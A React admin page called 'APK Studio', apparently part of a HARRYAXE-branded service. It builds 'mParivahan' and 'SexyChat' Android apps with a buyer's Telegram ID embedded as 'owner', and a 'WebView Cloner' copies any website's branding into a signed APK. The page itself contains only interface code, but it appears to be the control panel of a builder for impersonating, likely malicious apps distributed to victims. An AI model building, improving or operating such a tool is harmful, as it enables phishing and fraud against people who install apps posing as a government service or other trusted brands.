import { useEffect, useState } from 'react';
import { Layout } from '@/components/layout';
import { useToast } from '@/hooks/use-toast';
import {
  Hammer, Loader2, Smartphone, Package, Download, Trash2, CheckCircle2, RefreshCw, User, FileArchive,
  Globe, Paintbrush, Palette, MonitorSmartphone, Wand2, Link2, Sparkles, Image as ImageIcon, ChevronRight,
} from 'lucide-react';
import { apiFetch } from '@/lib/apiFetch';

const API = `${import.meta.env.VITE_API_URL ?? ''}/api/apk`;

interface StatusResp {
  ready: boolean;
  sexyReady: boolean;
  cached: Record<string, { size: number; modified: number }>;
  downloads: Record<string, number>;
}

function fmtSize(n: number): string {
  return `${(n / 1024 / 1024).toFixed(1)} MB`;
}

export function ApkStudio() {
  const { toast } = useToast();
  const [status, setStatus] = useState<StatusResp | null>(null);
  const [telegramId, setTelegramId] = useState('');
  const [building, setBuilding] = useState<string | null>(null); // 'mparivahan' | 'sexychat'
  const [result, setResult] = useState<any>(null);

  // ── WebView cloner state ──
  const [cTemplate, setCTemplate] = useState<'mparivahan' | 'sexy'>('mparivahan');
  const [cUrl, setCUrl] = useState('');
  const [cName, setCName] = useState('');
  const [cSplash, setCSplash] = useState('');
  const [cColor, setCColor] = useState('0f172a');
  const [cOrient, setCOrient] = useState<'portrait' | 'landscape' | 'sensor'>('portrait');
  const [cIconUrl, setCIconUrl] = useState('');
  const [cIconPreview, setCIconPreview] = useState('');
  const [cloneInfo, setCloneInfo] = useState<{ title: string; themeColor: string } | null>(null);
  const [cloning, setCloning] = useState(false);
  const [customBuilding, setCustomBuilding] = useState(false);
  const [customResult, setCustomResult] = useState<any>(null);
  const [step, setStep] = useState(1);

  const UI_PRESETS = [
    { name: 'Dark Pro', color: '0f172a', tag: 'Deep navy' },
    { name: 'Glass', color: '8b5cf6', tag: 'Violet' },
    { name: 'Neon', color: '06b6d4', tag: 'Cyan' },
    { name: 'Corporate', color: '2563eb', tag: 'Blue' },
    { name: 'Ocean', color: '0891b2', tag: 'Teal' },
    { name: 'Sunset', color: 'f97316', tag: 'Orange' },
  ];

  const fetchCloneInfo = async () => {
    const url = cUrl.trim();
    if (!/^https?:\/\//.test(url)) {
      toast({ title: 'Invalid URL', description: 'Enter a full http(s) URL first', variant: 'destructive' });
      return;
    }
    setCloning(true);
    setCloneInfo(null);
    try {
      const res = await apiFetch(`${API}/clone-info`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url }),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || `HTTP ${res.status}`);
      setCloneInfo({ title: json.title, themeColor: json.themeColor || '' });
      if (json.themeColor && /^#[0-9a-fA-F]{6}$/.test(json.themeColor)) setCColor(json.themeColor.replace('#', ''));
      if (!cName && json.title) setCName(json.title.replace(/[|\-].*$/, '').trim().slice(0, 28));
      if (json.iconUrl) setCIconUrl(json.iconUrl);
      if (json.iconDataUrl) setCIconPreview(json.iconDataUrl);
      toast({ title: 'Site cloned', description: json.title ? `“${json.title}” — assets extracted` : 'No title found, continuing' });
    } catch (err: any) {
      toast({ title: 'Clone failed', description: err.message, variant: 'destructive' });
    } finally {
      setCloning(false);
    }
  };

  const buildCustom = async () => {
    const url = cUrl.trim();
    if (!/^https?:\/\//.test(url)) {
      toast({ title: 'Invalid URL', description: 'Enter a full http(s) URL first', variant: 'destructive' });
      return;
    }
    setCustomBuilding(true);
    setCustomResult(null);
    try {
      const res = await apiFetch(`${API}/custom-build`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url, appName: cName || 'My App', splashText: cSplash || 'Powered by HARRYAXE',
          themeColor: cColor, orientation: cOrient, template: cTemplate,
          telegramId: telegramId, iconUrl: cIconUrl || undefined,
        }),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || `HTTP ${res.status}`);
      setCustomResult(json);
      toast({ title: 'Custom APK ready', description: `${json.file} — ${fmtSize(json.size)}` });
      refresh();
    } catch (err: any) {
      toast({ title: 'Custom build failed', description: err.message, variant: 'destructive' });
    } finally {
      setCustomBuilding(false);
    }
  };

  const refresh = async () => {
    try {
      const res = await apiFetch(`${API}/status`);
      const json = await res.json();
      if (res.ok) setStatus(json);
    } catch { /* ignore */ }
  };

  useEffect(() => {
    refresh();
    const t = setInterval(refresh, 15000);
    return () => clearInterval(t);
  }, []);

  const build = async (app: 'mparivahan' | 'sexychat') => {
    const id = telegramId.trim();
    if (!/^\d{5,12}$/.test(id)) {
      toast({ title: 'Invalid ID', description: 'Enter a valid numeric Telegram ID', variant: 'destructive' });
      return;
    }
    setBuilding(app);
    setResult(null);
    try {
      const res = await apiFetch(`${API}/build`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ app, telegramId: id }),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || `HTTP ${res.status}`);
      setResult(json);
      toast({ title: 'APK ready', description: `${app} built for ${id} — ${fmtSize(json.size)}` });
      refresh();
    } catch (err: any) {
      toast({ title: 'Build failed', description: err.message, variant: 'destructive' });
    } finally {
      setBuilding(null);
    }
  };

  const purge = async (id: string) => {
    try {
      const res = await apiFetch(`${API}/purge`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegramId: id }),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || 'Purge failed');
      toast({ title: 'Cache cleared', description: `Removed: ${json.removed?.join(', ') || 'nothing'}` });
      refresh();
    } catch (err: any) {
      toast({ title: 'Purge failed', description: err.message, variant: 'destructive' });
    }
  };

  const downloadCustom = async () => {
    if (!customResult?.downloadUrl) return;
    try {
      const res = await apiFetch(`${import.meta.env.VITE_API_URL ?? ''}${customResult.downloadUrl}`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = customResult.file || 'custom.apk';
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
    } catch (err: any) {
      toast({ title: 'Download failed', description: err.message, variant: 'destructive' });
    }
  };

  const cachedEntries = Object.entries(status?.cached || {});

  const StepNav = ({ backTo }: { backTo?: number }) => (
    <div className="flex justify-between">
      {backTo ? (
        <button onClick={() => setStep(backTo)} className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl border border-card-border text-sm font-bold text-muted-foreground hover:text-foreground transition-colors">
          <ChevronRight className="w-4 h-4 rotate-180" /> Back
        </button>
      ) : <span />}
      <button onClick={() => setStep(step + 1)} className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-primary text-primary-foreground text-sm font-bold hover:bg-primary/90 transition-colors">
        Continue <ChevronRight className="w-4 h-4" />
      </button>
    </div>
  );

  return (
    <Layout>
      <div className="flex flex-col gap-4 mb-5">
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div>
            <p className="page-eyebrow flex items-center gap-2">
              <Hammer className="w-3 h-3 text-primary" /> Custom Builds
            </p>
            <h1 className="page-title text-3xl">
              <span className="text-gradient">APK Studio</span>
            </h1>
            <p className="text-sm text-muted-foreground mt-1.5">
              Build fresh mParivahan and SexyChat APKs for any user — owner ID baked in automatically.
            </p>
          </div>
          <button
            onClick={refresh}
            className="flex items-center gap-2 px-4 h-10 rounded-xl border border-card-border bg-card text-sm font-semibold text-muted-foreground hover:text-foreground hover:border-primary transition-all"
          >
            <RefreshCw className="w-4 h-4" /> Refresh
          </button>
        </div>

        {/* Template readiness */}
        <div className="flex flex-wrap gap-2">
          {[
            { name: 'mParivahan', ok: !!status?.ready, chip: 'SMART DRIVE', icon: Smartphone },
            { name: 'SexyChat', ok: !!status?.sexyReady, chip: 'FUN APP', icon: Package },
          ].map((t) => {
            const count = Object.entries(status?.cached || {}).filter(
              ([f]) => (t.name === 'SexyChat') === f.startsWith('sexy_')
            ).length;
            return (
              <div
                key={t.name}
                className={`inline-flex items-center gap-3 px-4 py-2.5 rounded-2xl border text-xs font-semibold transition-colors ${
                  t.ok
                    ? 'bg-success/5 text-success border-success/25'
                    : 'bg-warning/5 text-warning border-warning/25'
                }`}
              >
                <span className={`relative flex items-center justify-center w-9 h-9 rounded-xl ${t.ok ? 'bg-success/15' : 'bg-warning/15'}`}>
                  <t.icon className="w-4 h-4" />
                  <span className={`absolute -top-1 -right-1 w-2.5 h-2.5 rounded-full ${t.ok ? 'bg-success animate-pulse' : 'bg-warning'} ring-2 ring-card`} />
                </span>
                <span className="flex flex-col leading-tight">
                  <span className="font-display font-bold text-sm text-foreground">{t.name}</span>
                  <span className="text-[10px] font-bold tracking-widest opacity-80">{t.chip} · HARRYAXE</span>
                </span>
                <span className="font-mono text-[10px] font-bold px-2 py-0.5 rounded-lg bg-black/30">
                  {t.ok ? 'READY' : 'WARMUP'} · {count} cached
                </span>
              </div>
            );
          })}
        </div>
      </div>

      {/* Builder */}
      <div className="relative overflow-hidden rounded-2xl border border-card-border bg-card/70 backdrop-blur p-5 mb-6">
        <span className="absolute -top-12 -right-12 w-40 h-40 rounded-full bg-primary/10 blur-3xl" />
        <h2 className="font-display font-semibold text-base mb-1 flex items-center gap-2">
          <User className="w-4 h-4 text-primary" /> Build for a user
        </h2>
        <p className="text-xs text-muted-foreground mb-4">
          Enter the user's Telegram ID — the APK gets their ID baked in as the owner.
        </p>
        <div className="flex flex-col sm:flex-row gap-3">
          <input
            type="text"
            inputMode="numeric"
            placeholder="Telegram ID (e.g. 5064888403)"
            value={telegramId}
            onChange={(e) => setTelegramId(e.target.value)}
            className="flex-1 bg-card border border-card-border rounded-xl px-4 py-3 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-primary/40"
          />
          <button
            onClick={() => build('mparivahan')}
            disabled={building !== null}
            className="flex items-center justify-center gap-2 px-5 h-12 bg-primary text-primary-foreground rounded-xl text-sm font-semibold hover:bg-primary/90 disabled:opacity-50 transition-all shadow-md shadow-primary/20"
          >
            {building === 'mparivahan' ? <Loader2 className="w-4 h-4 animate-spin" /> : <Smartphone className="w-4 h-4" />}
            Build mParivahan
          </button>
          <button
            onClick={() => build('sexychat')}
            disabled={building !== null}
            className="flex items-center justify-center gap-2 px-5 h-12 bg-gradient-to-r from-accent to-primary text-white rounded-xl text-sm font-semibold hover:opacity-90 disabled:opacity-50 transition-all shadow-md shadow-accent/20"
          >
            {building === 'sexychat' ? <Loader2 className="w-4 h-4 animate-spin" /> : <Package className="w-4 h-4" />}
            Build SexyChat
          </button>
        </div>

        {result && (
          <div className="mt-4 p-4 rounded-xl border border-success/25 bg-success/5 flex flex-col sm:flex-row sm:items-center gap-3">
            <CheckCircle2 className="w-5 h-5 text-success shrink-0" />
            <div className="flex-1 min-w-0 text-sm">
              <p className="font-semibold text-foreground">
                {result.app === 'sexychat' ? 'SexyChat' : 'mParivahan'} · {fmtSize(result.size)}
              </p>
              <p className="font-mono text-xs text-muted-foreground truncate">{result.file}</p>
            </div>
            <a
              href={`${import.meta.env.VITE_API_URL ?? ''}${result.downloadUrl}`}
              className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl bg-success/15 text-success text-sm font-semibold hover:bg-success/25 transition-colors"
            >
              <Download className="w-4 h-4" /> Download
            </a>
          </div>
        )}
      </div>

      {/* Cached APKs */}
      <div className="relative overflow-hidden rounded-2xl border border-card-border bg-card/70 backdrop-blur p-5">
        <span className="absolute -bottom-12 -right-12 w-40 h-40 rounded-full bg-accent/10 blur-3xl" />
        <h2 className="font-display font-semibold text-base mb-1 flex items-center gap-2">
          <FileArchive className="w-4 h-4 text-primary" /> Cached builds
        </h2>
        <p className="text-xs text-muted-foreground mb-4">
          Already-built APKs are served instantly without rebuilding.
        </p>

        {cachedEntries.length === 0 ? (
          <p className="text-sm text-muted-foreground py-6 text-center">
            No cached APKs yet — build one above.
          </p>
        ) : (
          <div className="space-y-2">
            {cachedEntries.map(([file, info]) => {
              const id = file.replace(/^(sexy_)?|\.apk$/g, '').replace(/\.apk$/, '');
              const sexy = file.startsWith('sexy_');
              return (
                <div key={file} className="flex items-center gap-3 p-3 rounded-xl border border-card-border bg-card/60">
                  <span className={`flex items-center justify-center w-10 h-10 rounded-xl ${sexy ? 'bg-gradient-to-br from-accent/20 to-primary/10 text-accent' : 'bg-primary/10 text-primary'}`}>
                    {sexy ? <Package className="w-5 h-5" /> : <Smartphone className="w-5 h-5" />}
                  </span>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-semibold truncate">{sexy ? 'SexyChat' : 'mParivahan'}</p>
                    <p className="font-mono text-xs text-muted-foreground truncate">
                      {id} · {fmtSize(info.size)}
                    </p>
                  </div>
                  <div className="flex items-center gap-1.5 shrink-0">
                    <span className="font-mono text-[10px] font-bold text-muted-foreground bg-muted/60 border border-card-border px-2 py-1 rounded-lg" title="Download count">
                      <Download className="w-2.5 h-2.5 inline mr-1" />
                      {status?.downloads?.[file] || 0}
                    </span>
                    <span className="font-mono text-[10px] text-muted-foreground/70 hidden md:inline" title="Cached since">
                      {new Date(info.modified).toLocaleDateString()}
                    </span>
                  </div>
                  <a
                    href={`${import.meta.env.VITE_API_URL ?? ''}/api/apk/${sexy ? 'sexychat/' : ''}download?telegramId=${id}`}
                    className="p-2.5 rounded-xl text-muted-foreground hover:text-primary hover:bg-muted transition-colors"
                    title="Download"
                  >
                    <Download className="w-4 h-4" />
                  </a>
                  <button
                    onClick={() => purge(id)}
                    className="p-2.5 rounded-xl text-muted-foreground hover:text-destructive hover:bg-destructive/10 transition-colors"
                    title="Purge cache"
                  >
                    <Trash2 className="w-4 h-4" />
                  </button>
                </div>
              );
            })}
          </div>
        )}
      </div>
      {/* ── WebView Cloner — clone any website into an APK ── */}
      <div className="relative overflow-hidden rounded-2xl border border-card-border bg-card/70 backdrop-blur p-5 mb-6">
        <span className="absolute -top-16 -right-16 w-52 h-52 rounded-full bg-accent/10 blur-3xl pointer-events-none" />
        <div className="relative flex items-center gap-3 mb-4">
          <div className="flex items-center justify-center w-11 h-11 rounded-2xl bg-gradient-to-br from-accent/25 to-primary/10 text-accent ring-1 ring-accent/30">
            <Wand2 className="w-5 h-5" />
          </div>
          <div>
            <h2 className="font-display font-semibold text-base">WebView Cloner</h2>
            <p className="text-xs text-muted-foreground">Clone any website — assets, colors & brand — into a fresh signed APK</p>
          </div>
        </div>

        {/* Step indicator */}
        <div className="flex items-center gap-2 mb-5">
          {['Template & type', 'Clone website', 'UI / UX design', 'Details & build'].map((label, i) => (
            <button
              key={label}
              onClick={() => setStep(i + 1)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-[11px] font-bold transition-all ${
                step === i + 1 ? 'bg-accent/15 text-accent ring-1 ring-accent/40' : 'text-muted-foreground hover:text-foreground'
              }`}
            >
              <span className={`font-mono ${step > i + 1 ? 'text-success' : ''}`}>{i + 1}</span>
              {label}
            </button>
          ))}
        </div>

        {/* Step 1: template + type */}
        {step === 1 && (
          <div className="space-y-4">
            <p className="text-sm font-semibold text-foreground flex items-center gap-2"><Package className="w-4 h-4 text-primary" /> Choose your base</p>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {([
                { key: 'mparivahan', name: 'Smart Drive', desc: 'Utility / panel-style base', icon: Smartphone },
                { key: 'sexy', name: 'Fun App', desc: 'Playful / entertainment base', icon: Package },
              ] as const).map((t) => (
                <button
                  key={t.key}
                  onClick={() => setCTemplate(t.key)}
                  className={`text-left p-4 rounded-2xl border transition-all ${
                    cTemplate === t.key ? 'border-accent/60 bg-accent/10 ring-1 ring-accent/40' : 'border-card-border bg-card/60 hover:border-accent/40'
                  }`}
                >
                  <t.icon className={`w-5 h-5 mb-2 ${cTemplate === t.key ? 'text-accent' : 'text-muted-foreground'}`} />
                  <p className="text-sm font-bold text-foreground">{t.name}</p>
                  <p className="text-xs text-muted-foreground mt-0.5">{t.desc}</p>
                </button>
              ))}
            </div>
            <StepNav />
          </div>
        )}

        {/* Step 2: clone website */}
        {step === 2 && (
          <div className="space-y-4">
            <p className="text-sm font-semibold text-foreground flex items-center gap-2"><Globe className="w-4 h-4 text-primary" /> Website to clone</p>
            <div className="flex flex-col sm:flex-row gap-2">
              <div className="relative flex-1">
                <Link2 className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <input
                  type="text"
                  value={cUrl}
                  onChange={(e) => setCUrl(e.target.value)}
                  placeholder="https://your-site.com"
                  className="w-full bg-card border border-input rounded-xl py-3 pl-11 pr-4 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-accent/30 focus:border-accent/50"
                />
              </div>
              <button
                onClick={fetchCloneInfo}
                disabled={cloning}
                className="inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl bg-accent/15 text-accent border border-accent/30 text-sm font-bold hover:bg-accent/25 transition-all disabled:opacity-50"
              >
                {cloning ? <Loader2 className="w-4 h-4 animate-spin" /> : <Sparkles className="w-4 h-4" />}
                {cloning ? 'Cloning…' : 'Fetch site assets'}
              </button>
            </div>

            {cloneInfo && (
              <div className="flex items-center gap-3 p-3 rounded-xl border border-accent/25 bg-accent/5">
                {cIconPreview ? (
                  <img src={cIconPreview} alt="site icon" className="w-10 h-10 rounded-lg bg-white/10 object-contain" />
                ) : (
                  <ImageIcon className="w-6 h-6 text-muted-foreground" />
                )}
                <div className="min-w-0">
                  <p className="text-sm font-bold text-foreground truncate">{cloneInfo.title || 'Site cloned'}</p>
                  <p className="text-xs text-muted-foreground">
                    Icon, title & colors extracted — {cloneInfo.themeColor ? `theme ${cloneInfo.themeColor} detected` : 'theme color not declared, using preset'}
                  </p>
                </div>
                {cIconPreview && (
                  <button
                    onClick={() => setCIconPreview('')}
                    className="ml-auto text-[10px] font-bold text-muted-foreground hover:text-destructive px-2 py-1 rounded-lg border border-card-border"
                  >
                    Remove icon
                  </button>
                )}
              </div>
            )}

            <StepNav backTo={1} />
          </div>
        )}

        {/* Step 3: UI/UX design */}
        {step === 3 && (
          <div className="space-y-4">
            <p className="text-sm font-semibold text-foreground flex items-center gap-2"><Paintbrush className="w-4 h-4 text-primary" /> UI / UX design preset</p>
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
              {UI_PRESETS.map((preset) => (
                <button
                  key={preset.name}
                  onClick={() => setCColor(preset.color)}
                  className={`p-4 rounded-2xl border transition-all text-left ${
                    cColor === preset.color ? 'border-accent/60 bg-accent/10 ring-1 ring-accent/40' : 'border-card-border bg-card/60 hover:border-accent/40'
                  }`}
                >
                  <span className="flex gap-1.5 mb-2.5">
                    <span className="w-6 h-6 rounded-full ring-2 ring-white/10" style={{ background: `#${preset.color}` }} />
                    <span className="w-6 h-6 rounded-full ring-2 ring-white/10" style={{ background: `#${preset.color}66` }} />
                  </span>
                  <p className="text-sm font-bold text-foreground">{preset.name}</p>
                  <p className="text-xs text-muted-foreground mt-0.5">{preset.tag}</p>
                </button>
              ))}
            </div>
            <div className="flex flex-col sm:flex-row gap-3 items-start sm:items-center">
              <label className="text-xs font-bold text-muted-foreground">Custom color</label>
              <input type="color" value={`#${cColor}`} onChange={(e) => setCColor(e.target.value.replace('#', ''))} className="w-12 h-9 rounded-lg border border-card-border bg-transparent cursor-pointer" />
              <span className="font-mono text-xs text-muted-foreground">#{cColor}</span>
              <label className="text-xs font-bold text-muted-foreground ml-2">Orientation</label>
              <div className="flex gap-1 p-1 rounded-xl border border-card-border bg-card/70">
                {(['portrait', 'landscape', 'sensor'] as const).map((o) => (
                  <button key={o} onClick={() => setCOrient(o)} className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors ${cOrient === o ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'}`}>
                    {o}
                  </button>
                ))}
              </div>
            </div>
            <StepNav backTo={2} />
          </div>
        )}

        {/* Step 4: details + build */}
        {step === 4 && (
          <div className="space-y-4">
            <p className="text-sm font-semibold text-foreground flex items-center gap-2"><MonitorSmartphone className="w-4 h-4 text-primary" /> App details</p>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="text-xs font-bold text-muted-foreground block mb-1.5">App name</label>
                <input type="text" value={cName} onChange={(e) => setCName(e.target.value)} placeholder="My App"
                  className="w-full bg-card border border-input rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-accent/30" />
              </div>
              <div>
                <label className="text-xs font-bold text-muted-foreground block mb-1.5">Splash text</label>
                <input type="text" value={cSplash} onChange={(e) => setCSplash(e.target.value)} placeholder="Powered by HARRYAXE"
                  className="w-full bg-card border border-input rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-accent/30" />
              </div>
            </div>

            {/* live splash preview */}
            <div className="rounded-2xl overflow-hidden border border-card-border" style={{ background: `linear-gradient(135deg, #${cColor} 0%, #${cColor}99 100%)` }}>
              <div className="p-6 text-center">
                <p className="text-2xl">🚀</p>
                <p className="text-white font-bold text-lg mt-2" style={{ textShadow: '0 2px 12px rgba(0,0,0,0.3)' }}>{cName || 'My App'}</p>
                <p className="text-white/85 text-xs mt-1">{cSplash || 'Powered by HARRYAXE'}</p>
                <div className="w-6 h-6 border-2 border-white/35 border-t-white rounded-full animate-spin mx-auto mt-4" />
              </div>
            </div>

            <div className="flex items-center justify-between gap-3 flex-wrap">
              <button onClick={() => setStep(3)} className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl border border-card-border text-sm font-bold text-muted-foreground hover:text-foreground transition-colors">
                <ChevronRight className="w-4 h-4 rotate-180" /> Back
              </button>
              <button
                onClick={buildCustom}
                disabled={customBuilding}
                className="inline-flex items-center gap-2 px-6 py-3 rounded-xl bg-gradient-to-r from-accent to-primary text-primary-foreground text-sm font-bold hover:opacity-90 transition-all disabled:opacity-50 shadow-lg shadow-accent/25"
              >
                {customBuilding ? <Loader2 className="w-4 h-4 animate-spin" /> : <Hammer className="w-4 h-4" />}
                {customBuilding ? 'Building & signing… (60–90s)' : 'Build & sign APK'}
              </button>
            </div>

            {customResult && (
              <div className="flex items-center gap-3 p-4 rounded-2xl border border-success/30 bg-success/5">
                <CheckCircle2 className="w-5 h-5 text-success shrink-0" />
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-bold text-foreground">{customResult.file}</p>
                  <p className="text-xs text-muted-foreground font-mono">{fmtSize(customResult.size)} · signed · cached</p>
                </div>
                <button onClick={downloadCustom}
                  className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl bg-success text-success-foreground text-sm font-bold hover:bg-success/90 transition-colors shrink-0">
                  <Download className="w-4 h-4" /> Download
                </button>
              </div>
            )}
          </div>
        )}
      </div>

    </Layout>
  );
}